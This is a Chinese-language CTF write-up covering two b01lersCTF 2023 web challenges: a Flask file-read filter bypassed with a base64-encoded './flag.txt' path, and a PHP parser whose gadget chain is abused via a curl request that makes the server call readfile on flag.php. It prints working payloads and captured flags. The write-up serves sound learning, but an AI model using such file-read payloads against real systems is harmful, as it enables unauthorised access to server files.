---
title: "b01lersCTF2023 Wp"
slug: "b01lersctf2023-wp"
description: "论我是怎么被php.galf笑死的"
date: 2023-03-20T23:55:05+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://ctf.b01lers.com/challenges?category=web

## warmup

> My first flask app, I hope you like it
> [http://ctf.b01lers.com:5115](http://ctf.b01lers.com:5115/)
> Author: CygnusX

```python
from base64 import b64decode

import flask

app = flask.Flask(__name__)


@app.route('/')
def index2(name):
    name = b64decode(name)
    if (validate(name)):
        return "This file is blocked!"
    try:
        file = open(name, 'r').read()
    except:
        return "File Not Found"
    return file


@app.route('/')
def index():
    return flask.redirect('/aW5kZXguaHRtbA==')


def validate(data):
    if data == b'flag.txt':
        return True
    return False


if __name__ == '__main__':
    app.run()

```

payload: http://ctf.b01lers.com:5115/Li9mbGFnLnR4dA==

`bctf{h4d_fun_w1th_my_l4st_m1nut3_w4rmuP????!}`

## php.galf

> found one of my old projects, but I can't seem to figure out how it works... tried to update it but that might have backfired :(
> note: this is using php 7.4
> [http://ctf.b01lers.com:5120](http://ctf.b01lers.com:5120/)
> Author: CygnusX

![image-20230318224145644](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230318224145644.png)

结合flag.php的存在，应该是需要我们读出源码，可以用readfile

![image-20230318224316180](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230318224316180.png)

功能上是一个parser，对输入进行运算，简单审一下 会发现sink点应该在这里

![image-20230318230157875](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230318230157875.png)

然后就要看怎么触发这个`__toString`了。——但是吧，这个题只适合倒着从payload讲链子 >_<

```
readfile('flag.php');
noitpecxe-> __toString
noitpecxe-> __consturct
syntaxreader-> __construct
orez_vid-> __invoke
orez_vid-> __construct
orez_dda-> __invoke
orez_dda-> __construct
```

巧妙之处在于这个parser对于操作数和参数的处理近似于“递归”

![image-20230320233055633](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320233055633.png)

![image-20230320233015928](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320233015928.png)

每读到一个ohce都会`new ohce()`实例并调用它的invoke，并在其中继续向后找一位参数，如果是`orez_lum`或`orez_dda`中的一个就继续`new xxx()`并调用invoke，而这个orez_dda的invoke也是类似的操作

![image-20230320233521553](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320233521553.png)

我们下一个调用的类用orez_vid，让它的下一个参数是syntaxreader

![image-20230320233751504](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320233751504.png)

这样传入syntaxreader就会触发noitpecxe

![image-20230320234050894](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320234050894.png)

![image-20230320234131363](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320234131363.png)

给noitpecxe传进去的args有7个，但是construct只要4个，用这个缺口 我们把第1个和第4个参数分别设成flag.php和readfile，就自然会变成这里的message和error_func

之后就没什么可说的了，顺利调用readfile，getflag~

payload:

```bash
curl 'http://ctf.b01lers.com:5120/index.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: DEBUG[]=0' --data-raw 'code=ohce+ohce+ohce+ohce+ohce&args=flag.php%2C+bbbbb%2C+ccccc%2C+readfile%2C+orez_dda%2C+orez_vid%2C+syntaxreader'
```

![image-20230320235216149](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230320235216149.png)

*另：虽然我上面说的好像这个过程很简单，但我调了半天才理清楚……我tcl……

*另另：究极冷笑话之：ohce-> echo, noitpecxe-> exception, php.galf-> flag.php, orez_vid-> div_zero, orez_dda-> add_zero……太冷了 我已经到南极了